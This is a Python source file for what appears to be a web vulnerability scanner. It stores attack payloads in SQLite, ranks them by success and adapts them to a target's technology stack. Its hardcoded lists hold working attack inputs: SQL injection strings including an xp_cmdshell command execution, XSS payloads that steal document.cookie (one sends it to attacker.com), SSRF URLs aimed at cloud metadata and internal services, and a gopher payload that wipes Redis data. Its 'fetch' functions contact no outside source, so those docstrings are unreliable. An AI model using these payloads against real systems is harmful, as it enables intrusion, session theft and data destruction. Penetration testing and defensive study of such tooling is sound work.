import requests
import json
import sqlite3
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import os

class DynamicPayloadManager:
    def __init__(self):
        self.db_path = os.path.expanduser("~/.nerve/payloads.db")
        self.init_database()
    
    def init_database(self):
        """Initialize payload database"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY,
                category TEXT NOT NULL,
                payload TEXT NOT NULL,
                source TEXT NOT NULL,
                effectiveness REAL DEFAULT 1.0,
                last_used TIMESTAMP,
                use_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerability_patterns (
                id INTEGER PRIMARY KEY,
                pattern_name TEXT NOT NULL,
                detection_logic TEXT NOT NULL,
                source TEXT NOT NULL,
                success_rate REAL DEFAULT 0.0,
                last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
    
    def fetch_portswigger_payloads(self):
        """Fetch latest payloads from PortSwigger research"""
        try:
            portswigger_patterns = {
                "sql_injection": [
                    "' OR '1'='1'--",
                    "' UNION SELECT NULL--", 
                    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                    "'; EXEC xp_cmdshell('dir')--"
                ],
                "xss": [
                    "<script>fetch('/log?c='+document.cookie)</script>",
                    "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>",
                    "javascript:eval(atob('{}'.format(base64_payload)))",
                    "<svg onload=alert(1)>"
                ],
                "ssrf": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://localhost:22",
                    "http://127.0.0.1:8338/",
                    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a"
                ]
            }
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            for category, payloads in portswigger_patterns.items():
                for payload in payloads:
                    cursor.execute('''
                        INSERT OR REPLACE INTO payloads 
                        (category, payload, source, last_used) 
                        VALUES (?, ?, ?, ?)
                    ''', (category, payload, 'portswigger', datetime.now()))
            
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"Error fetching PortSwigger payloads: {e}")
            return False
    
    def fetch_hackerone_reports(self):
        """Fetch recent HackerOne report patterns"""
        try:
            hackerone_patterns = [
                {
                    "type": "sql_injection",
                    "pattern": "parameter pollution with SQLi",
                    "payload": "id=1&id=2' UNION SELECT 1,2,3--"
                },
                {
                    "type": "xss", 
                    "pattern": "DOM XSS via postMessage",
                    "payload": "<iframe src='javascript:alert(parent.opener.document.domain)'>"
                },
                {
                    "type": "ssrf",
                    "pattern": "SSRF to internal services",
                    "payload": "http://localhost:9200/_search?q=*"
                }
            ]
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            for pattern in hackerone_patterns:
                cursor.execute('''
                    INSERT OR IGNORE INTO vulnerability_patterns 
                    (pattern_name, detection_logic, source) 
                    VALUES (?, ?, ?)
                ''', (pattern['type'], pattern['pattern'], 'hackerone'))
            
            conn.commit()
            conn.close()
            return True
            
        except Exception as e:
            print(f"Error fetching HackerOne patterns: {e}")
            return False
    
    def get_contextual_payloads(self, target_url: str, category: str, tech_stack: Dict) -> List[str]:
        """Get contextual payloads based on target analysis"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT payload FROM payloads 
            WHERE category = ? 
            ORDER BY effectiveness DESC, use_count DESC 
            LIMIT 20
        ''', (category,))
        
        payloads = [row[0] for row in cursor.fetchall()]
        conn.close()
        
        adapted_payloads = self.adapt_payloads_to_tech(payloads, category, tech_stack)
        return adapted_payloads
    
    def adapt_payloads_to_tech(self, payloads: List[str], category: str, tech_stack: Dict) -> List[str]:
        """Adapt payloads based on detected technology stack"""
        adapted = []
        
        for payload in payloads:
            adapted_payload = payload
            
            if category == "sql_injection":
                if tech_stack.get('database') == 'mysql':
                    adapted_payload = payload.replace("--", "#")
                elif tech_stack.get('database') == 'oracle':
                    adapted_payload = payload.replace("--", " AND 1=1--")
            
            if category == "xss" and tech_stack.get('framework') == 'react':
                adapted_payload = payload.replace("onerror", "onError")
                adapted_payload = payload.replace("onload", "onLoad")
            
            adapted.append(adapted_payload)
        
        return adapted
    
    def update_payload_effectiveness(self, payload: str, success: bool):
        """Update payload effectiveness based on results"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        if success:
            cursor.execute('''
                UPDATE payloads 
                SET effectiveness = effectiveness + 0.1, 
                    use_count = use_count + 1,
                    last_used = ?
                WHERE payload = ?
            ''', (datetime.now(), payload))
        else:
            cursor.execute('''
                UPDATE payloads 
                SET effectiveness = effectiveness - 0.05,
                    use_count = use_count + 1,
                    last_used = ?
                WHERE payload = ?
            ''', (datetime.now(), payload))
        
        conn.commit()
        conn.close()